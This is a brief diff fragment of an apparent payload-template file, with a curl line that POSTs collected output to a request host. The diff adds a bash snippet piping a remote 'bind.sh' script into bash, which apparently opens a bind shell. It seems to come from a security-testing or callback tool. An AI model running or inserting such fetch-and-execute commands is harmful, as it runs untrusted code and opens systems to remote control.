@@ -21,3 +21,8 @@ data:
     echo $r
     curl "{{.Request.Host}}/l/res/" --data "$r" -X POST
 ---
+
+
+```bash
+curl xodbox/bind.sh|bash
+```
